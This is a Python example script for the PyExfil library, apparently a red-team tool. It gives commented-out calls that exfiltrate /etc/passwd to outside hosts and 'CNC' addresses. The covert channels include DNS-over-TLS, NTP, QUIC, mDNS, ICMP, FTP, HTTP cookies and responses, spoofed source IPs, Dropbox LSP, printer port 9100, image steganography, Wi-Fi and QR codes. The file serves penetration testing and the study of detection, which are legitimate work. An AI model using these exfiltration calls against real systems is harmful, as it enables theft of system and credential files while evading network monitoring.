#!/usr/bin/env python

import sys


FILE_TO_EXFIL = "/etc/passwd"


""" COMMUNICATION EXAMPLES """

""" DNS Over TLS """
# from pyexfil.Comm.DNSoTLS.client import Send
# Send(data="Hal, please open the bay door.", server='1.1.1.1')

# from pyexfil.Comm.DNSoTLS.server import StartServer
# StartServer(server_name='8.8.8.8', port=8888, clients=1, certfile='/etc/cert.pem', keep_ratio=True)


""" NTP Body (Request) """
# from pyexfil.Comm.NTP_Body.client import Broadcast
# Broadcast(data="Hello World", to='ntp.morirt.com', port=123, key="s3kr3t")

# from pyexfil.Comm.NTP_Body.server import Broker
# b = Broker()
# b.listen_clients()

""" GUIC """
# from pyexfil.Comm.GQUIC import Send

# Send(file_name='/etc/passwd', CNC_ip='1.1.1.1', CNC_port=443, key='IMPICKLERICK!')

""" MDNS Query """
# from pyexfil.Comm.MDNS import Send
#
# Send('1.1.1.1', "It's time to get schwifty", sequence=42, spoof_source=False, dns_name='google.com')
# Send('1.1.1.1', "You gotta get schwifty", sequence=43, spoof_source='1.2.3.4', dns_name='yahoo.com')

""" AllJoyn IoT """
# import uuid
#
# from pyexfil.Comm.AllJoyn import Send, ALLJOYN_PORT
#
# Send(
# 		dst_ip = "8.8.8.8",
# 		from_ip = "1.1.1.1",
# 		data = 'Now online',
# 		src_port=ALLJOYN_PORT,
# 		session_id=uuid.uuid4().hex
# )


""" NETWORK EXAMPLES """


""" HTTP Cookies """
# from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file
#
# send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)


""" Source IP Based  """
# from pyexfil.network.FTP.ftp_exfil import FTPExfiltrator
#
# FTPexf = FTPExfiltrator(file2exfil=FILE_TO_EXFIL, server="8.8.8.8", port=21, creds=(), tls=False)
# FTPexf.get_file_chunks()
# FTPexf.build_final_chunks()
# FTPexf.send_chunks()


""" Source IP Based * """
# from pyexfil.network.SpoofIP.spoofIPs_client import _send
#
# _send(file_path=FILE_TO_EXFIL, to="8.8.8.8")


""" DropBox LSP """
# # Can also be used to CNC communication inside network.
# from pyexfil.network.DB_LSP.dblsp import DB_LSP
#
# dbLSP = DB_LSP(
#                     cnc='192.168.1.255',
#                     data=open(FILE_TO_EXFIL, 'rb').read(),
#                     key="Donnie!"
#                     )
# dbLSP._Create()
# dbLSP.Send()


""" Exfiltration Over ICMP * """
# from pyexfil.network.ICMP.icmp_exfiltration import send_file
#
# send_file(  "8.8.8.8",
#             src_ip_addr="127.0.0.1",
#             file_path=FILE_TO_EXFIL,
#             max_packetsize=512,
#             SLEEP=0.1)

""" Over HTTP Response """
# from pyexfil.network.HTTPResp.client import Broadcast
# b = Broadcast(
#                 fname="/etc/passwd",
#                 dst_ip="www.espn.com",
#                 dst_port=80,
#                 max_size=1024,
#                 key=DEFAULT_KEY
#                 )
# b.Exfiltrate()


""" Communicate over 9100 """
# import thread
# from pyexfil.Comm.jetdirect.communicator import Broker
#
#
# def PRINT (src, data):
# 	print(src)
# 	print(data)
#
#
# b = Broker("patient0", host = "127.0.0.1", port = 9100, key = "123", retFunc = PRINT)
# thread.start_new_thread(b.listen_clients, ())
# b.broadcast_message("hello world!")


""" STEGANOGRAPHY EXAMPLES """

""" Binary offset in file """
# from pyexfil.Stega.binoffset.binoffset import CreateExfiltrationFile
#
# CreateExfiltrationFile(
#             originalImage='pyexfil/Stega/binoffset/image.png',
#             rawData=FILE_TO_EXFIL,
#             OutputImage="/tmp/new.png")


""" PHYSICAL EXAMPLES """


""" Example for Wifi Payload """
# from pyexfil.physical.wifiPayload.client import exfiltrate
#
# exfiltrate(FILE_TO_EXFIL)

""" Example for QRCode Exfiltration """
# from pyexfil.physical.qr.generator import CreateQRs, PlayQRs
# if CreateQRs(FILE_TO_EXFIL):
#     PlayQRs()
# else:
#     sys.stderr.write("Something went wrong with creating QRs.\n")
